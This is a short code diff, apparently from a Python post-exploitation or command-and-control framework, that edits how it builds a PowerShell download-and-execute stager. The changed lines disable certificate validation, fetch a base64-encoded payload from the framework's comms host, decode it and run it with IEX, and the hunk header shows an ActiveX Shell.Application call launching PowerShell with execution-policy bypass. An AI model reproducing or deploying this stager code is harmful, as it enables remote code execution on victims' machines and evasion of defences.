@@ -371,8 +371,8 @@ a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec b
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Execution via Command Prompt" + Colours.GREEN)
 
-        psuri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_bs"
-        pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX (new-object system.net.webclient).downloadstring('%s')" % psuri
+        psuri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_rp"
+        pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
         psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
         uri = self.PayloadCommsHost + ":" + self.Serverport + "/" + QuickCommand + "_cs"
 
